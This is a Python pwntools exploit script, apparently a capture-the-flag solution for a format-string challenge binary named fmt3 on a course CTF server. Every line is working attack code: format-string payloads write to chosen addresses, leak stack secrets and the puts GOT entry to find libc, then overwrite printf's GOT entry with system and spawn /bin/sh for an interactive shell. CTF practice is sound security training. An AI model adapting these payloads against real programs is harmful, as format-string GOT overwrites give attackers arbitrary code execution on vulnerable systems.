from pwn import *
from time import sleep

r = remote("csie.ctf.tw", 10129)
# r = process("./fmt3", env = {"LD_PRELOAD" : "./libc-2-27.so"})

a = 0x6012ac
puts_got = 0x601218
puts_off = 0x809c0
printf_got = 0x601230
system_off = 0x4f440

# flag1
# b00c face
payload = "%45068c%24$hn%19138c%25$hnABC%8$p.%9$pABC%26$s".ljust(0x40, '\x00') + p64(a) + p64(a+2) + p64(puts_got)
r.send(payload)

# flag2
r.recvuntil("ABC0x")
secret = p64(int(r.recvuntil(".0x")[:-3], 16)) + p64(int(r.recvuntil("ABC")[:-3], 16))
puts = u64(r.recv(6).ljust(8, "\x00"))
libc = puts - puts_off
system = libc + system_off
r.send(secret)

# flag3
r.recvuntil("Osass:")
payload2 = ("%{}c%13$hhn%{}c%14$hn".format(system & 0xff, ((system & 0xffff00) >> 8) - (system & 0xff))).ljust(0x18, "\x00") + p64(printf_got) + p64(printf_got+1)
r.sendline(payload2)
r.recvuntil("again!")
r.sendline("/bin/sh")

r.interactive()
